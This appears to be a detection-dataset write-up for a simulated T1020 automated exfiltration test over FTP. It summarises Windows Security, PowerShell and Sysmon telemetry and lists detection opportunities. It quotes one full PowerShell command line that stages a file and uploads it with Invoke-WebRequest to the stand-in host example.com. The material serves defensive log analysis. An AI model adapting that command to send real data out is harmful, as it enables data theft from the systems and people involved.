# T1020-2: Automated Exfiltration — Exfiltration via Encrypted FTP

## Technique Context

T1020 Automated Exfiltration represents adversary attempts to establish automated processes for data theft, often using scheduled scripts or programmatic methods to periodically exfiltrate information without manual intervention. The "encrypted FTP" variant specifically focuses on using FTP with encryption (like FTPS or SFTP) to transfer stolen data to external servers. This technique is particularly valuable to attackers because it can blend with legitimate administrative traffic and provides a reliable channel for large-scale data theft operations. Detection teams typically focus on identifying unusual outbound FTP connections, PowerShell network activity, automated file staging behaviors, and credential prompts that might indicate exfiltration preparation.

## What This Dataset Contains

This dataset captures a PowerShell-based FTP exfiltration simulation that creates a sample file and attempts to upload it via FTP. The Security channel shows the complete process execution chain in EID 4688 events, including the parent PowerShell process (PID 6584) spawning a child PowerShell process (PID 4176) with the command line: `"powershell.exe" & {$sampleData = "Sample data for exfiltration test"; Set-Content -Path "C:\temp\T1020__FTP_sample.txt" -Value $sampleData; $ftpUrl = "ftp://example.com"; $creds = Get-Credential -Credential "[user:password]"; Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds}`.

The PowerShell channel captures the actual script execution in EID 4104 events, showing the script block containing the exfiltration logic and a Set-Content command invocation in EID 4103: `CommandInvocation(Set-Content): "Set-Content" ParameterBinding(Set-Content): name="Path"; value="C:\temp\T1020__FTP_sample.txt" ParameterBinding(Set-Content): name="Value"; value="Sample data for exfiltration test"`.

Sysmon provides detailed process creation events for both PowerShell instances (EID 1), process access events showing the parent PowerShell accessing child processes (EID 10), and critically, a file creation event (EID 11) showing the sample file being written: `TargetFilename: C:\temp\T1020__FTP_sample.txt`. The dataset also contains image load events (EID 7) showing PowerShell loading .NET runtime components and network-related DLLs like urlmon.dll.

## What This Dataset Does Not Contain

The dataset lacks the actual network exfiltration attempt because the technique targets a non-existent FTP server ("ftp://example.com"). This means there are no Sysmon network connection events (EID 3), DNS queries (EID 22), or any evidence of successful data transmission. The PowerShell execution likely failed at the credential prompt or network connection phase, so we don't see the complete exfiltration workflow.

Additionally, the dataset doesn't show Windows Defender blocking the activity, suggesting the simulation used benign test data and didn't trigger real-time protection. The lack of subsequent file deletion or cleanup activities means we can't observe the full operational security practices an attacker might employ.

## Assessment

This dataset provides excellent visibility into the initial stages of automated PowerShell-based exfiltration, particularly the file staging phase. The combination of Security 4688 process creation events with full command lines, PowerShell script block logging, and Sysmon file creation events creates a comprehensive detection opportunity. However, the absence of actual network activity limits its value for testing network-based detection rules. The telemetry is strongest for identifying suspicious PowerShell patterns, file staging behaviors, and the characteristic command-line signatures of FTP upload attempts.

## Detection Opportunities Present in This Data

1. **PowerShell Command Line Analysis** - Security EID 4688 events contain the complete exfiltration script in the command line, including suspicious patterns like "Invoke-WebRequest", "ftp://", "-Method Put", and credential handling functions.

2. **Script Block Content Detection** - PowerShell EID 4104 events capture the actual script blocks containing FTP upload logic, providing opportunities to detect exfiltration-related PowerShell cmdlets and parameters.

3. **File Staging Activity** - Sysmon EID 11 file creation events show temporary files being created in staging directories (C:\temp) with suspicious naming patterns like "T1020__FTP_sample.txt".

4. **PowerShell Network DLL Loading** - Sysmon EID 7 events show PowerShell loading urlmon.dll and other network-related libraries that could indicate impending network activity.

5. **Process Chain Analysis** - The parent-child PowerShell relationship visible in both Security and Sysmon events indicates potential script-spawned exfiltration processes.

6. **Set-Content Parameter Monitoring** - PowerShell EID 4103 command invocation events show file content being written with specific paths and data, useful for detecting data staging operations.

7. **Suspicious PowerShell Execution Context** - Multiple PowerShell processes running under SYSTEM context with network-related activities could indicate automated or scripted exfiltration attempts.
